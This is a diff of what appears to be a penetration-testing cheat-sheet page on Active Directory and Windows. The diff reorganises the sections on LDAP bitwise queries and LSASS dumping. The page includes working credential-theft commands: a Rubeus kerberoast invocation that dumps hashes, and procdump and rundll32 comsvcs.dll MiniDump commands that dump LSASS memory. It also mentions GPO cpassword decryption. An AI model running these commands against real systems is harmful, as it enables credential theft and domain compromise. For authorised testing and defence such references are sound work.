@@ -90,8 +90,6 @@
     
         <li><a class="" href="#collect-ad-users-information">Collect AD users information</a></li>
     
-        <li><a class="" href="#ldap-query-structure">LDAP Query structure</a></li>
-    
         <li><a class="" href="#decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</a></li>
     
         <li><a class="" href="#use-win32-api-in-python">Use Win32 API in Python</a></li>
@@ -117,8 +115,6 @@
         <li><a class="" href="#add-user-to-local-admin">Add user to local admin</a></li>
     
         <li><a class="" href="#extract-microsoft-update-files">Extract Microsoft Update files</a></li>
-    
-        <li><a class="" href="#dumping-lsass">Dumping lsass</a></li>
     
     </ul>
     
@@ -317,6 +313,13 @@ $ $computers = (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&am
 $ foreach($c in $computers) { echo &quot;$($c.name) ($($c.useraccountcontrol))&quot; }
 </code></pre>
 
+<p>The website <a href="https://ldapwiki.com/wiki/" target="_blank">LdapWiki</a> explains how to write a LDAP query. For instance,
+if we want to use bitwise in ldap queries, we need to use some special arguments.</p>
+<p>There are two Bitwise operation Extensible Match Rules.</p>
+<pre><code>1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
+1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
+</code></pre>
+
 <p><img alt="" src="https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png" /></p>
 <p>With <a href="https://github.com/GhostPack/Rubeus" target="_blank">Rubeus</a>, it's possible to dump the hashes:</p>
 <pre><code class="language-bash">Rubeus.exe kerberoast /creduser:&quot;&lt;fqdn_dom&gt;\&lt;user&gt;&quot; /credpassword:&quot;&lt;password&gt;&quot; /domain:&quot;&lt;fqdn_dom&gt;&quot; /outfile:&quot;kerberoast.hash.txt&quot;
@@ -355,14 +358,6 @@ foreach($user in $DomainAdmins) { echo &quot;$($user.displayname) ($($user.samac
 
 #
 (New-Object System.DirectoryServices.DirectorySearcher(&quot;(&amp;(objectCategory=Computer)(cn=SCU44625))&quot;)).FindAll()
-</code></pre>
-
-<h3 id="ldap-query-structure">LDAP Query structure</h3>
-<p>The website <a href="https://ldapwiki.com/wiki/" target="_blank">LdapWiki</a> explains how to write a LDAP query. For instance,
-if we want to use bitwise in ldap queries, we need to use some splecial arguments.</p>
-<p>There are two Bitwise operation Extensible Match Rules.</p>
-<pre><code>1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND)
-1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)
 </code></pre>
 
 <h3 id="decrypt-gpo-with-cpassword">Decrypt GPO with cpassword</h3>
@@ -417,9 +412,15 @@ if __name__ == &quot;__main__&quot;:
 <li><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" target="_blank">ProcDump</a></li>
 <li>TaskManager</li>
 <li>Rundll32</li>
+<li><a href="https://github.com/Hackndo/lsassy" target="_blank">lsassy</a></li>
 </ul>
-<pre><code class="language-bash">$ procdump -accepteula -ma lsass.exe lsass.dmp
-$ Powershell -c rundll32.exe &quot;C:\Windows\System32\comsvcs.dll&quot;, MiniDump [process ID of lsass.exe] dump.bin full
+<h4 id="procdump">Procdump</h4>
+<pre><code class="language-bash">procdump -accepteula -ma lsass.exe lsass.dmp
+</code></pre>
+
+<h4 id="rundll32-comsvcsdll">Rundll32 &amp; comsvcs.dll</h4>
+<pre><code class="language-bash">tasklist /fi &quot;imagename eq lsass.exe&quot;
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; lsass.dmp full
 </code></pre>
 
 <h3 id="sam-and-system-backup">SAM and SYSTEM backup</h3>
@@ -497,11 +498,6 @@ contains the new binaries (<code>.dll</code>, <code>.exe</code>, ...). To extrac
 can use the <code>expand</code> command:</p>
 <pre><code class="language-bash">expand -f:* &quot;update.msu&quot; &quot;%temp%\\update.msu&quot;
 expand -f:* &quot;%temp%\\update.msu\\update.cab&quot; &quot;%temp%\\update.msu\\update.cab&quot;
-</code></pre>
-
-<h3 id="dumping-lsass">Dumping lsass</h3>
-<pre><code class="language-bash">tasklist /fi &quot;imagename eq lsass.exe&quot;
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump &lt;PID&gt; lsass.dmp full
 </code></pre>
             
           </div>
